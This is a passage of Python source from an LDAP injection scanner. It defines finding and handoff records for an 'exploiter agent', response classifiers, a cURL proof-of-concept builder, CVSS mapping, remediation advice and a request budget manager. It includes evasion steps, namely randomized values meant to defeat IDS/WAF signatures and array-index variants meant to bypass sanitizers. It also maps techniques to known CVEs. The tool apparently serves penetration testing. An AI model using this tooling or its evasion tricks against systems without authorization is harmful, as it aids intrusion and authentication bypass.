    """Structured record for signals that could not be confirmed (v3.0)."""
    endpoint_url:    str
    parameter_name:  str
    signal_fired:    str        # which detector
    reason:          str        # why confirmation failed
    payloads_tried:  List[str]
    recommendation:  str        # what exploiter agent should try manually


@dataclass
class HandoffFinding:
    """
    The ONLY output format. Every field serves the exploiter agent.
    This is the contract between detection and exploitation.
    """
    # Identity
    finding_id:              str
    scan_id:                 str
    timestamp:               str

    # Location
    endpoint_url:            str
    http_method:             str
    parameter_name:          str
    auth_state:              str   # unauth|auth|both

    # Payload
    payload_raw:             str
    payload_encoding:        str
    payload_technique:       str
    payload_tier:            str
    alternative_payloads:    List[str]  = field(default_factory=list)

    # Verification
    verification_grade:      str   = "CANDIDATE"
    verification_steps:      List[str] = field(default_factory=list)
    reproduction_confidence: int   = 0

    # Severity
    severity:                str   = "MEDIUM"
    severity_reason:         str   = ""

    # Response analysis
    baseline_response_class: str   = "STATIC"
    injected_response_class: str   = "STATIC"
    detection_signals:       List[str] = field(default_factory=list)
    diff_ratio:              float  = 0.0
    timing_zscore:           Optional[float] = None
    timing_delta_ms:         Optional[float] = None

    # LDAP-specific evidence
    ldap_error_snippet:      Optional[str]  = None
    filter_reflection:       Optional[str]  = None
    oob_triggered:           bool   = False

    # Reproduction
    curl_poc:                str    = ""
    raw_http_request:        str    = ""

    # Context (from Phase 0)
    ldap_server_type:        str    = "generic"
    framework_detected:      str    = "generic"
    waf_detected:            bool   = False
    survived_metacharacters: List[str] = field(default_factory=list)

    # Enterprise Reporting (v3.0)
    cvss_vector:               str          = ""
    cvss_score:                float        = 0.0
    non_destructive_confirmed: bool         = True
    remediation_guidance:      str          = ""
    affected_ldap_attributes:  List[str]    = field(default_factory=list)
    schema_enumerated:         bool         = False
    lockout_risk:              bool         = False
    second_order:              bool         = False
    exploiter_context:         Dict[str, Any] = field(default_factory=dict)

    # V8 — Enhanced reporting fields
    impact_scenario:           str          = ""   # real-world attack scenario description
    impact_type:               str          = ""   # authentication_bypass|data_exfiltration|etc
    blast_radius:              str          = ""   # user|department|domain|all
    attack_chain:              List[str]    = field(default_factory=list)
    retest_steps:              List[str]    = field(default_factory=list)
    behavioral_signals:        List[str]    = field(default_factory=list)
    function_class:            str          = "generic"  # auth|search|query|generic
    correlation_ids:           List[str]    = field(default_factory=list)
    mutation_chain_used:       str          = ""   # which mutation chain cracked WAF


@dataclass
class ScanHandoff:
    """
    The complete JSON handoff document.
    Root object of ldapi_findings.json.
    """
    schema_version:   str   = "3.0"
    tool:             str   = f"{TOOL_NAME} v{VERSION}"
    scan_id:          str   = ""
    target:           str   = ""
    timestamp_start:  str   = ""
    timestamp_end:    str   = ""
    duration_seconds: float = 0.0

    # Scan context (from Phase 0)
    ldap_server_type:        str          = "generic"
    framework_detected:      str          = "generic"
    waf_detected:            bool         = False
    waf_name:                str          = ""
    survived_metacharacters: List[str]    = field(default_factory=list)
    raw_ldap_ports_open:     List[int]    = field(default_factory=list)
    auth_tested:             bool         = False
    budget_mode:             str          = "B"

    # Findings by grade
    confirmed_findings:  List[Dict]  = field(default_factory=list)
    probable_findings:   List[Dict]  = field(default_factory=list)
    candidate_findings:  List[Dict]  = field(default_factory=list)
    inconclusive_findings: List[Dict] = field(default_factory=list)
    raw_ldap_findings:   List[Dict]  = field(default_factory=list)

    # Statistics
    total_requests:          int  = 0
    endpoints_discovered:    int  = 0
    endpoints_scanned:       int  = 0
    unauth_endpoints_tested: int  = 0
    auth_endpoints_tested:   int  = 0
    payloads_sent:           int  = 0
    signals_fired:           int  = 0
    fp_filtered:             int  = 0
    total_cvss_score:        float = 0.0

    # V11 — WAF Indeterminate State
    waf_confidence:              str          = "indeterminate"  # none|low|medium|high|indeterminate

    # V11 — Liveness pre-flight
    target_live:                 bool         = True
    target_dns_resolved:         bool         = False
    target_ports_open:           List[int]    = field(default_factory=list)

    # V11 — Execution trace
    execution_trace:             List[Dict]   = field(default_factory=list)

    # V8 — Extended handoff fields
    cross_endpoint_correlations: List[Dict] = field(default_factory=list)
    behavioral_risk_summary:     Dict[str, Any] = field(default_factory=dict)
    control_plane_summary:       Dict[str, Any] = field(default_factory=dict)
    openapi_specs_found:         List[str]      = field(default_factory=list)
    graphql_endpoints_found:     List[str]      = field(default_factory=list)
    websocket_endpoints_found:   List[str]      = field(default_factory=list)
    adaptive_delay_applied:      float          = 0.0
    mutation_chains_effective:   List[str]      = field(default_factory=list)


# ═══════════════════════════════════════════════════════════════════════════════
# §7  HELPER UTILITIES
# ═══════════════════════════════════════════════════════════════════════════════

def _body_hash(text: str) -> str:
    """Raw MD5 hash of response body."""
    return hashlib.md5(
        text.encode("utf-8", errors="replace")
    ).hexdigest()


def _norm_body_hash(text: str) -> str:
    """
    Normalized hash — strips dynamic tokens, collapses whitespace.
    Used for replay consistency checks.
    """
    normalized = DYNAMIC_TOKEN_RE.sub("__DYN__", text)
    normalized = re.sub(r'\d+', '__NUM__', normalized)
    normalized = re.sub(r'\s+', ' ', normalized).strip()
    return hashlib.md5(
        normalized.encode("utf-8", errors="replace")
    ).hexdigest()


def _tokenize_4gram(text: str) -> Set[str]:
    """4-gram shingle set for Jaccard similarity."""
    cleaned = re.sub(
        r"\s+", " ",
        DYNAMIC_TOKEN_RE.sub("__D__", text)
    ).strip().lower()[:4000]
    if len(cleaned) <= 4:
        return set(cleaned)
    return {cleaned[i:i + 4] for i in range(len(cleaned) - 3)}


def normalize_json_response(text: str) -> str:
    """
    ENHANCEMENT #8: Normalize JSON responses to prevent false positives from trivial dynamic values.
    - Sorts JSON keys for consistent ordering
    - Replaces numeric IDs with __ID__
    - Strips CSRF/nonce fields
    - Removes timestamps and UUIDs
    """
    try:
        data = json.loads(text)
        
        def normalize_value(v):
            if isinstance(v, dict):
                # Strip CSRF/nonce/token fields
                filtered = {k: normalize_value(v) for k, v in v.items()
                           if not re.search(r"csrf|nonce|token|_token", k, re.I)}
                # Sort keys for consistency
                return json.dumps(filtered, sort_keys=True, separators=(',', ':'))
            elif isinstance(v, list):
                return json.dumps([normalize_value(item) for item in v], separators=(',', ':'))
            elif isinstance(v, str):
                # Replace UUIDs and timestamps
                v = re.sub(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', '__UUID__', v, flags=re.I)
                v = re.sub(r'\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}', '__TS__', v)
                # Replace numeric IDs
                v = re.sub(r'\b\d{5,}\b', '__ID__', v)
                return v
            elif isinstance(v, (int, float)):
                # Replace all numeric values except small constants
                if abs(v) > 1000:
                    return '__NUM__'
                return str(v)
            else:
                return str(v)
        
        normalized_data = normalize_value(data)
        return normalized_data if isinstance(normalized_data, str) else json.dumps(normalized_data, sort_keys=True)
    except (json.JSONDecodeError, ValueError, TypeError):
        # Not valid JSON - return as-is
        return text


def sim_delta(a: str, b: str) -> float:
    """
    Jaccard-based similarity delta.
    0.0 = identical, 1.0 = completely different.
    Applies dynamic token normalization before computing shingles.
    ENHANCEMENT #8: Now normalizes JSON responses for better comparison.
    """
    if not a and not b:
        return 0.0
    if not a or not b:
        return 1.0
    
    # ENHANCEMENT #8: Try JSON normalization if both look like JSON
    if a.strip().startswith('{') or a.strip().startswith('['):
        a = normalize_json_response(a)
    if b.strip().startswith('{') or b.strip().startswith('['):
        b = normalize_json_response(b)
    
    a_norm = re.sub(r'\d+', '__N__',
                    DYNAMIC_TOKEN_RE.sub("__D__", a))
    b_norm = re.sub(r'\d+', '__N__',
                    DYNAMIC_TOKEN_RE.sub("__D__", b))
    sa, sb = _tokenize_4gram(a_norm), _tokenize_4gram(b_norm)
    if not sa and not sb:
        return 0.0
    inter = len(sa & sb)
    union = len(sa | sb)
    return 1.0 - (inter / union) if union else 0.0


def classify_response_body(body: str, status: int, cookies: Set[str],
                           has_prior_baseline: bool = False,
                           baseline: Any = None) -> str:
    """
    Unified response classifier for both baseline and injection stages.
    Returns a ResponseClass value.
    Eliminates Score=1.0 root cause by ensuring identical matching logic.
    """
    if status in (301, 302, 303, 307, 308):
        return ResponseClass.REDIRECT.value

    if status in (500, 502, 503) or LDAP_ERRORS_RE.search(body):
        return ResponseClass.ERROR.value

    # Primary detection: Auth success
    is_success = bool(AUTH_SUCCESS_HIGH_RE.search(body) or AUTH_SUCCESS_LOW_RE.search(body))
    
    if is_success:
        if has_prior_baseline and baseline:
            # Injection mode: success only if NOT already in baseline
            bl_success = bool(AUTH_SUCCESS_HIGH_RE.search(baseline.body) or AUTH_SUCCESS_LOW_RE.search(baseline.body))
            if not bl_success:
                return ResponseClass.AUTH_SUCCESS.value
        else:
            # Baseline mode or no baseline
            return ResponseClass.AUTH_SUCCESS.value

    # Form vanished (auth bypass indicator) - only in injection mode
    if has_prior_baseline and baseline:
        baseline_had_real_form = 'action=' in baseline.body.lower() if baseline.has_form else False
        if (baseline.has_form and baseline_had_real_form
                and status == 200
                and not re.search(r"<form[\s>]", body, re.I)
                and not (AUTH_FAIL_RE.search(body)
                         or AUTH_FAIL_HTML_RE.search(body))):
            return ResponseClass.AUTH_SUCCESS.value

    # New session cookie issued - only in injection mode
    if has_prior_baseline and baseline:
        new_ck = cookies - baseline.cookies
        if any(re.search(r"session|auth|token|jwt|sid|access", c, re.I) for c in new_ck):
            return ResponseClass.AUTH_SUCCESS.value

    # Auth failure patterns
    if (AUTH_FAIL_RE.search(body)
            or AUTH_FAIL_HTML_RE.search(body)
            or status in (401, 403)):
        return ResponseClass.AUTH_FAIL.value

    return ResponseClass.STATIC.value


def classify_response(resp: "requests.Response",
                      baseline: Any) -> str:
    """Compatibility wrapper for DetectionPipeline."""
    return classify_response_body(
        body=resp.text or "",
        status=resp.status_code,
        cookies={c.name for c in resp.cookies},
        has_prior_baseline=True,
        baseline=baseline
    )


def classify_baseline_response(resp: "requests.Response") -> str:
    """Compatibility wrapper for BaselineCollector."""
    return classify_response_body(
        body=resp.text or "",
        status=resp.status_code,
        cookies={c.name for c in resp.cookies},
        has_prior_baseline=False
    )


def safe_val(param_name: str, suffix: str = "") -> str:
    """
    Generate a semantically appropriate safe value for a parameter.
    Used for baseline collection (with randomized suffix).
    ENHANCEMENT #5: Passwords now use truly random values to defeat IDS fingerprinting.
    """
    import secrets
    if not suffix:
        suffix = str(random.randint(1000, 9999))
    nl = param_name.lower()
    if any(k in nl for k in ("user", "uid", "login", "account", "principal")):
        return f"user{suffix}"
    if any(k in nl for k in ("email", "mail")):
        return f"user{suffix}@test.invalid"
    if any(k in nl for k in ("pass", "pwd", "cred", "secret", "pin")):
        # ENHANCEMENT #5: Random password per request instead of deterministic "S@fe8472!"
        # This defeats IDS/WAF signature matching on safe values
        return secrets.token_urlsafe(12)
    if any(k in nl for k in ("search", "query", "q", "find")):
        return f"query{suffix}"
    if any(k in nl for k in ("filter", "ldap")):
        return f"(cn=base{suffix})"
    if any(k in nl for k in ("dn", "base")):
        return f"cn=base{suffix},dc=test,dc=invalid"
    return f"val{suffix}"


def build_safe_data(params: List[str],
                     randomize: bool = True) -> Dict[str, str]:
    """Build safe parameter dict. Randomized for baseline, deterministic for replay."""
    suffix = str(random.randint(1000, 9999)) if randomize else "8472"
    return {p: safe_val(p, suffix) for p in params}


# FIX 4: In build_injection_data — ensure password field
# always gets a non-empty value on auth endpoints

def build_injection_data(ep: Endpoint,
                          inject_param: str,
                          inject_value: str,
                          suffix: str = "8472") -> Dict[str, str]:
    if ep.default_params:
        data = dict(ep.default_params)
    else:
        data = {p: safe_val(p, suffix) for p in ep.params}
    for p in ep.params:
        if p not in data:
            data[p] = ""
        # Ensure password-type params always have non-empty value
        # Empty password causes server to reject before LDAP query runs
        if (p != inject_param
                and p.lower() in ("password","pass","pwd","pin")
                and not data[p]):
            data[p] = f"TestPass{suffix}"   # deterministic non-empty
    data[inject_param] = inject_value
    return data


def build_array_injection_data(ep: Endpoint,
                               inject_param: str,
                               inject_value: str,
                               suffix: str = "8472") -> List[Dict[str, str]]:
    """
    Build both flat and array-style injection data variants (G1).
    Returns list of data dictionaries to try:
      - Flat: {param: payload}
      - Array: {param[]: payload, param[0]: payload, param[1]: payload}
    """
    base = build_injection_data(ep, inject_param, inject_value, suffix)
    variants = [base]
    
    # Array-style variants (catches index-based sanitizer bypasses)
    array_variants = {
        f"{inject_param}[]": inject_value,
        f"{inject_param}[0]": inject_value,
        f"{inject_param}[1]": inject_value,   # index 1 — often skipped by sanitizers
    }
    variants.append(array_variants)
    return variants


def finding_id() -> str:
    """Generate unique finding identifier."""
    return f"LDAPi-{uuid.uuid4().hex[:8].upper()}"


def build_curl_poc(ep: Endpoint, param: str, payload: str,
                   cookies: Optional[Dict[str, str]] = None,
                   extra_headers: Optional[Dict[str, str]] = None) -> str:
    """
    V7 FIX: Build a complete cURL PoC that includes session cookies and headers.
    Old version only built bare URL — could not reproduce findings that require auth cookies.
    """
    safe_pl = quote(payload, safe="")
    cookie_str = ""
    if cookies:
        cookie_str = " -b '" + "; ".join(f"{k}={v}" for k, v in cookies.items()) + "'"
    header_str = " -H 'Content-Type: application/x-www-form-urlencoded'"
    if extra_headers:
        for k, v in extra_headers.items():
            header_str += f" -H '{k}: {v}'"
    if ep.use_json:
        header_str = " -H 'Content-Type: application/json'"
    if ep.method.upper() == "POST":
        if ep.use_json:
            body = json.dumps({param: payload})
            return (f"curl -sk -X POST '{ep.url}'"
                    f"{cookie_str}{header_str}"
                    f" -d '{body}'")
        return (f"curl -sk -X POST '{ep.url}'"
                f"{cookie_str}{header_str}"
                f" -d '{param}={safe_pl}'")
    return f"curl -sk '{ep.url}?{param}={safe_pl}'{cookie_str}"


def build_raw_request(ep: Endpoint, param: str, payload: str) -> str:
    """Build raw HTTP request string for exploiter agent."""
    parsed = urlparse(ep.url)
    host   = parsed.netloc
    path   = parsed.path or "/"
    if ep.method.upper() == "POST":
        data = build_injection_data(ep, param, payload, suffix="8472")
        body = urlencode(data)
        return (f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(body)}\r\n\r\n"
                f"{body}")
    qs = urlencode({param: payload})
    return (f"GET {path}?{qs} HTTP/1.1\r\n"
            f"Host: {host}\r\n\r\n")


def severity_from_score(score: float,
                         has_auth_bypass: bool = False,
                         has_error: bool = False) -> Tuple[Severity, str]:
    """
    Map detection score to severity with reason string.
    Auth bypass is always CRITICAL regardless of score.
    """
    if has_auth_bypass:
        return Severity.CRITICAL, "Authentication bypass confirmed"
    if has_error and score >= 3.5:
        return Severity.HIGH, "LDAP error disclosure with high signal score"
    if score >= 5.0:
        return Severity.CRITICAL, "Multiple high-confidence signals confirmed"
    if score >= 3.5:
        return Severity.HIGH, "Strong multi-signal detection"
    if score >= 2.0:
        return Severity.MEDIUM, "Moderate signal with verification confirmed"
    return Severity.LOW, "Low-confidence signal, candidate for manual review"


def apex_domain(url: str) -> str:
    """Extract apex domain from URL for LDAP DC components."""
    try:
        host = urlparse(url).hostname or url
        parts = host.split(".")
        if len(parts) >= 2:
            return ".".join(parts[-2:])
        return host
    except Exception:
        return url


def domain_to_dc(domain: str) -> str:
    """Convert apex domain to LDAP DC string: example.com → dc=example,dc=com"""
    return ",".join(f"dc={part}" for part in domain.split(".") if part)


# ── CVSS v3.1 Vector Mapping (v3.0 §10.1) ────────────────────────────────────

_TECHNIQUE_TO_FAMILY = {
    "auth_bypass": "bypass", "ad_bypass": "bypass", "ol_bypass": "bypass",
    "spring_ldap": "bypass", "shiro_ldap": "bypass", "adsi_bypass": "bypass",
    "or_chain": "bypass", "null_byte": "bypass", "url_encoded": "bypass",
    "bool_true": "boolean", "bool_false": "boolean", "bool_enum": "boolean",
    "structural": "probe", "syntax": "probe", "wildcard": "probe",
    "oob_referral": "oob", "dn_inject": "dn_inject",
    "attr_harvest": "attr_harvest", "attr_inject": "attr_inject",
    "ad_enum": "enum", "ol_enum": "enum",
    "waf_url": "waf_bypass", "waf_hex": "waf_bypass",
    "second_order": "second_order",
    "cve_shiro": "bypass", "cve_spring": "bypass", "cve_null": "bypass",
    "cve_ldap3": "bypass", "cve_log4shell": "oob",
    "cve_nss": "bypass", "cve_nopac": "bypass", "cve_jboss": "bypass",
    "cve_manage": "bypass", "cve_vmware": "bypass", "cve_cisco": "bypass",
    "cve_openfire": "bypass", "cve_citrix": "bypass", "cve_confluence": "bypass",
}

_CVSS_VECTORS = {
    # family → (vector_string, base_score)
    "bypass":       ("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", 9.1),
    "boolean":      ("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", 7.5),
    "probe":        ("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", 5.3),
    "oob":          ("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N", 8.6),
    "dn_inject":    ("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N", 8.2),
    "attr_harvest": ("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", 7.5),
    "attr_inject":  ("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N", 8.2),
    "enum":         ("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", 5.3),
    "waf_bypass":   ("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N", 7.4),
    "second_order": ("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N", 7.4),
}


def assign_cvss(
    severity_name: str,
    technique: str,
    requires_auth: bool = False,
    has_auth_bypass: bool = False,
) -> Tuple[str, float]:
    """
    Map finding to CVSS v3.1 vector string and base score (v3.0).
    Returns (vector_string, base_score).
    """
    family = _TECHNIQUE_TO_FAMILY.get(technique, technique.split("_")[0])
    vec, score = _CVSS_VECTORS.get(family, ("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", 5.3))

    # Adjustments
    if has_auth_bypass:
        vec = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
        score = max(score, 9.1)
    if requires_auth and "/PR:N/" in vec:
        vec = vec.replace("/PR:N/", "/PR:L/")
        score = max(score - 0.5, 0.0)

    return vec, round(score, 1)


# ── Per-Framework Remediation Guidance (v3.0 §10.2) ──────────────────────────

_REMEDIATION = {
    "spring": (
        "1. Replace LdapTemplate.search() with parameterized LdapQueryBuilder.\n"
        "2. Use Spring Security's LdapAuthenticationProvider with bind authentication.\n"
        "3. Apply @Valid annotations on all user-facing DTO fields.\n"
        "4. Enable Spring Security CSRF protection.\n"
        "5. Set spring.ldap.base and spring.ldap.filter as server-side constants."
    ),
    "aspnet": (
        "1. Replace DirectorySearcher.Filter string concatenation with SearchFilter.And().\n"
        "2. Use System.DirectoryServices.AccountManagement (PrincipalContext) API.\n"
        "3. Apply input validation via DataAnnotations [RegularExpression].\n"
        "4. Enable request validation in web.config.\n"
        "5. Use parameterized LDAP queries via LdapConnection.SendRequest()."
    ),
    "shiro": (
        "1. Update to Apache Shiro >= 1.7.1 to patch CVE-2016-4437.\n"
        "2. Configure JndiLdapRealm with bind-authentication only.\n"
        "3. Use Shiro's built-in LdapContextFactory with pooling.\n"
        "4. Apply input sanitization in custom AuthorizingRealm."
    ),
    "java": (
        "1. Use javax.naming.directory.SearchControls with OBJECT_SCOPE.\n"
        "2. Escape all user input with JNDI SearchFilter escaping.\n"
        "3. Apply LDAP filter syntax validation before query construction.\n"
        "4. Use connection pooling via com.sun.jndi.ldap.connect.pool.\n"
        "5. Disable JNDI lookup in logging frameworks (log4j2.formatMsgNoLookups=true)."
    ),
    "php": (
        "1. Use ldap_escape() (PHP >= 5.6) for all user input in filters.\n"
        "2. Replace ldap_search() filter concatenation with parameterized builds.\n"
        "3. Validate input against ^[a-zA-Z0-9._-]+$ before LDAP operations.\n"
        "4. Use PHP-LDAP connection binding with service accounts only."
    ),
    "python": (
        "1. Use python-ldap's filter.escape_filter_chars() for input sanitization.\n"
        "2. Replace string formatting in search filters with ldap3 abstraction layer.\n"
        "3. Validate input with re.match(r'^[a-zA-Z0-9._@-]+$', user_input).\n"
        "4. Use SASL EXTERNAL or GSSAPI authentication instead of simple bind."
    ),
    "generic": (
        "1. Parameterize all LDAP filter construction — never concatenate user input.\n"
        "2. Apply allowlist input validation (alphanumeric + limited special chars).\n"
        "3. Escape LDAP metacharacters: * ( ) \\ / NUL using RFC 4515 §3.\n"
        "4. Use bind authentication with service accounts (not user-supplied DNs).\n"
        "5. Implement rate limiting and account lockout detection.\n"
        "6. Enable LDAP audit logging on the directory server.\n"
        "7. Restrict LDAP service account permissions to read-only on required OUs."
    ),
}


def get_remediation(framework: str) -> str:
    """Return framework-specific remediation guidance (v3.0)."""
    fw = framework.lower() if framework else "generic"
    return _REMEDIATION.get(fw, _REMEDIATION["generic"])


def now_iso() -> str:
    """Current timestamp in ISO 8601 UTC format."""
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")

# ═══════════════════════════════════════════════════════════════════════════════
# §8  ADAPTIVE BUDGET MANAGER
# ═══════════════════════════════════════════════════════════════════════════════

class AdaptiveBudgetManager:
    """
    Three-mode adaptive budget allocation with emergency reserve pool.

    Mode A — Minimal:    < 8 endpoints, no LDAP signals — 300 requests
    Mode B — Standard:   Default                        — 800 requests
    Mode C — High-Value: LDAP signals or ports open     — scales dynamically

    Pool ratios per mode:
                     A      B      C
      tier0_qualify  10%    10%    8%
      discovery      15%    12%    10%
      injection      50%    45%    42%
      verification   20%    28%    33%
      emergency       5%     5%     7%

    Emergency pool: drawn by verifier when active signal confirmed.
    Tier 0 pool: separate from injection — qualifying probes always run.
    Budget donation: unused pools flow forward to injection only.
    Per-endpoint floor: 15 injection requests guaranteed per qualified endpoint.
    """

    # Pool names
    POOL_TIER0        = "tier0_qualify"
    POOL_DISCOVERY    = "discovery"
    POOL_INJECTION    = "injection"
    POOL_VERIFICATION = "verification"
    POOL_EMERGENCY    = "emergency"

    # Ratios per mode [tier0, discovery, injection, verification, emergency]
    _RATIOS: Dict[str, List[float]] = {
        BudgetMode.MINIMAL.value:    [0.18, 0.15, 0.45, 0.17, 0.05],    # ← C2.5: Increased tier0 from 0.10 to 0.18
        BudgetMode.STANDARD.value:   [0.18, 0.12, 0.40, 0.25, 0.05],    # ← C2.5: Increased tier0 from 0.10 to 0.18
        BudgetMode.HIGH_VALUE.value: [0.16, 0.10, 0.38, 0.30, 0.06],    # ← C2.5: Increased tier0 from 0.08 to 0.16
    }

    # Base totals per mode
    _BASE_TOTALS: Dict[str, int] = {
        BudgetMode.MINIMAL.value:    300,
        BudgetMode.STANDARD.value:   800,
        BudgetMode.HIGH_VALUE.value: 1500,
    }

    # Per-endpoint injection floor (both auth states)
    _EP_FLOOR = 15

    def __init__(self, cfg: ScanConfig):
        self._cfg       = cfg
        self._lock      = threading.Lock()
        self._mode      = BudgetMode.STANDARD
        self._total     = cfg.request_budget
        self._pools:    Dict[str, int] = {}
        self._used:     Dict[str, int] = {}
        self._donated:  Dict[str, int] = defaultdict(int)
        self._ep_floors_reserved = 0
        self._signal_active      = False
        self._initialized        = False
        self._pre_init_burned    = 0

    # ── Mode Selection ────────────────────────────────────────────────────────

    def select_mode(self,
                    endpoint_count: int,
                    ldap_signals_found: bool,
                    ldap_ports_open: bool,
                    waf_detected: bool) -> BudgetMode:
        """
        Auto-select budget mode from target profile.
        Called after Phase 0 + Phase 1 complete.
        """
        is_high_value = (
            ldap_signals_found
            or ldap_ports_open
            or waf_detected
            or endpoint_count >= 20
        )
        is_minimal = (
            endpoint_count < 8
            and not ldap_signals_found
            and not ldap_ports_open
            and not waf_detected
        )

        if is_high_value:
            self._mode = BudgetMode.HIGH_VALUE
        elif is_minimal:
            self._mode = BudgetMode.MINIMAL
        else:
            self._mode = BudgetMode.STANDARD

        budget_msg(f"Budget mode: {self._mode.value} "
                   f"(endpoints={endpoint_count} "
                   f"ldap_signals={ldap_signals_found} "
                   f"ports_open={ldap_ports_open} "
                   f"waf={waf_detected})")
        return self._mode

    def initialize(self,
                   qualified_endpoint_count: int,
                   mode: Optional[BudgetMode] = None) -> None:
        """
        Allocate pools. Called after mode selection and endpoint count known.
        Total budget scales dynamically in Mode C:
          max(1500, qualified_endpoints × 35)
        """
        if mode:
            self._mode = mode

        mode_key = self._mode.value
        base_total = self._BASE_TOTALS[mode_key]

        # Mode C dynamic scaling
        if self._mode == BudgetMode.HIGH_VALUE:
            dynamic_total = max(
                base_total,
                qualified_endpoint_count * 35
            )
            # Respect user-configured ceiling if set explicitly
            if self._cfg.request_budget != 800:
                self._total = min(dynamic_total, self._cfg.request_budget)
            else:
                self._total = dynamic_total
        else:
            self._total = min(base_total, self._cfg.request_budget)

        # Deduct pre-initialization spending from the total before allocation
        with self._lock:
            self._total = max(1, self._total - self._pre_init_burned)

        # Reserve per-endpoint floors from injection pool
        floors_needed = qualified_endpoint_count * self._EP_FLOOR
        ratios = self._RATIOS[mode_key]
        pool_names = [
            self.POOL_TIER0,
            self.POOL_DISCOVERY,
            self.POOL_INJECTION,
            self.POOL_VERIFICATION,
            self.POOL_EMERGENCY,
        ]

        with self._lock:
            for name, ratio in zip(pool_names, ratios):
                self._pools[name] = max(1, int(self._total * ratio))
                self._used[name]  = 0

            # Ensure injection pool can cover all floors
            inj_pool = self._pools[self.POOL_INJECTION]
            if floors_needed > inj_pool:
                # Trim qualified endpoint set instead of exceeding budget
                max_eps = inj_pool // self._EP_FLOOR
                self._ep_floors_reserved = max_eps * self._EP_FLOOR
                budget_msg(
                    f"Budget floor trimming: "
                    f"can guarantee floor for {max_eps}/{qualified_endpoint_count} "
                    f"endpoints"
                )
            else:
                self._ep_floors_reserved = floors_needed

            self._initialized = True

        budget_msg(
            f"Budget initialized: total={self._total} "
            f"mode={mode_key} "
            f"pools={self.status()}"
        )

    # ── Acquisition ───────────────────────────────────────────────────────────

    def _acquire(self, pool: str, count: int = 1) -> bool:
        with self._lock:
            if not self._initialized:
                # Pre-initialization flat-budget mode.
                # Pools don't exist yet — use request_budget as a single ceiling.
                pre_used = sum(self._used.values())
                if pre_used + count <= self._cfg.request_budget:
                    self._used[pool] = self._used.get(pool, 0) + count
                    self._pre_init_burned += count
                    return True
                return False
            # Post-initialization: pool-specific budgets
            if self._used[pool] + count <= self._pools[pool]:
                self._used[pool] += count
                return True
            return False

    def acquire_tier0(self)        -> bool: return self._acquire(self.POOL_TIER0)
    def acquire_discovery(self)    -> bool: return self._acquire(self.POOL_DISCOVERY)
    def acquire_injection(self)    -> bool: return self._acquire(self.POOL_INJECTION)
    def acquire_verification(self) -> bool: return self._acquire(self.POOL_VERIFICATION)

    def acquire_emergency(self) -> bool:
        """
        Emergency budget — only available when active signal confirmed.
        Called by verifier when it needs extra requests to complete proof.
        """
        if not self._signal_active:
            return False
        return self._acquire(self.POOL_EMERGENCY)

    def signal_active(self, active: bool) -> None:
        """
        Mark that an active signal is being verified.
        Unlocks emergency pool access.
        """
        with self._lock:
            self._signal_active = active

    def acquire_for_phase(self, phase: str) -> bool:
        """Unified acquisition by phase name string."""
        dispatch = {
            "tier0":        self.acquire_tier0,
            "discovery":    self.acquire_discovery,
            "injection":    self.acquire_injection,
            "verification": self.acquire_verification,
            "emergency":    self.acquire_emergency,
        }
        fn = dispatch.get(phase, self.acquire_injection)
        return fn()

    # ── Donation ──────────────────────────────────────────────────────────────

    def donate_unused(self, from_pool: str) -> int:
        """Transfer unused budget from a completed phase to injection pool."""
        if not self._initialized:          # guard — pools don't exist yet
            return 0
        with self._lock:
            unused = (self._pools.get(from_pool, 0)
                      - self._used.get(from_pool, 0))
            if unused > 0 and from_pool != self.POOL_INJECTION:
                self._pools[self.POOL_INJECTION] += unused
                self._pools[from_pool] = self._used.get(from_pool, 0)
                self._donated[from_pool] += unused
                budget_msg(
                    f"Donated {unused} from {from_pool} "
                    f"→ injection pool "
                    f"(injection now: {self._remaining(self.POOL_INJECTION)})"
                )
                return unused
        return 0

    def donate_all_unused_to_injection(self) -> int:
        """Donate all non-injection unused budget to injection pool."""
        total_donated = 0
        for pool in [self.POOL_TIER0,
                     self.POOL_DISCOVERY,
                     self.POOL_EMERGENCY]:
            total_donated += self.donate_unused(pool)
        return total_donated

    # ── Queries ───────────────────────────────────────────────────────────────

    def _remaining(self, pool: str) -> int:
        return self._pools.get(pool, 0) - self._used.get(pool, 0)

    def remaining(self, pool: str) -> int:
        with self._lock:
            return self._remaining(pool)

    def total_used(self) -> int:
        with self._lock:
            return sum(self._used.values())

    def total_remaining(self) -> int:
        with self._lock:
            return sum(
                self._remaining(p)
                for p in self._pools
            )

    def is_exhausted(self, pool: str) -> bool:
        with self._lock:
            return self._remaining(pool) <= 0

    def can_guarantee_floor(self, n_endpoints: int) -> bool:
        """Check if injection pool can cover the per-endpoint floor."""
        with self._lock:
            needed = n_endpoints * self._EP_FLOOR
            return self._remaining(self.POOL_INJECTION) >= needed

    def status(self) -> Dict[str, Dict[str, int]]:
        with self._lock:
            return {
                pool: {
                    "total":     self._pools[pool],
                    "used":      self._used[pool],
                    "remaining": self._remaining(pool),
                }
                for pool in self._pools
            }

    def log_status(self) -> str:
        s = self.status()
        parts = [
            f"{p[:3]}:{v['used']}/{v['total']}"
            for p, v in s.items()
        ]
        return f"Budget[{' | '.join(parts)}]"

    @property
    def mode(self) -> BudgetMode:
        return self._mode

    @property
    def total(self) -> int:
        return self._total

# ═══════════════════════════════════════════════════════════════════════════════
# §9  RAW LDAP PROTOCOL TESTING
